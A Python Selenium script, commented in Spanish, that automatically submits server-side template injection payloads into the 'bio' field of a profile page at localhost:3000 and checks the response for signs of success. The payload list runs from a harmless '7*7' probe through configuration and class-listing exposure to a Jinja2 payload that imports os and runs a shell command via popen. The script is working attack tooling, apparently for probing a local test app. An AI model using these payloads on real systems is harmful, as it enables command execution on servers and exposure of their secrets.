from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Configuración
driver = webdriver.Chrome()
target_url = "http://localhost:3000/profile"

# Payloads para inyección de plantillas
payloads = [
    "{{7*7}}",  # Prueba básica
    "{{config.items()}}",  # Exponer configuración
    "{{''.__class__.__mro__[1].__subclasses__()}}",  # Listar clases
    "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}"  # Ejecución de comandos
]

try:
    driver.get(target_url)
    time.sleep(2)
    
    for payload in payloads:
        input_field = driver.find_element(By.NAME, "bio")
        input_field.clear()
        input_field.send_keys(payload)
        driver.find_element(By.ID, "save").click()
        time.sleep(2)
        
        # Verificar resultado
        if "49" in driver.page_source or "config" in driver.page_source:
            print(f"¡Inyección detectada con payload: {payload}")
            break
        
        driver.get(target_url)  # Recargar para siguiente prueba
    
finally:
    driver.quit()